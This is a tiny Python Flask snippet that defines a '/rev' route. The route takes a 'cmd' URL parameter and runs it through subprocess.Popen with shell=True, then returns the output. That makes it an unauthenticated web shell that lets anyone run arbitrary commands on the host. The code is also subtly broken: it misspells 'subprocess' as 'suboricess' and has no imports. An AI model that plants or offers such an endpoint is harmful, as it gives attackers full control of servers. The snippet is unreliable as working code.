#!/usr/bin/python3

@app.route('/rev')
def rev():
	command = request.args.get('cmd')
	execute = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=suboricess.PIPE)

	return execute.communicate()[0]
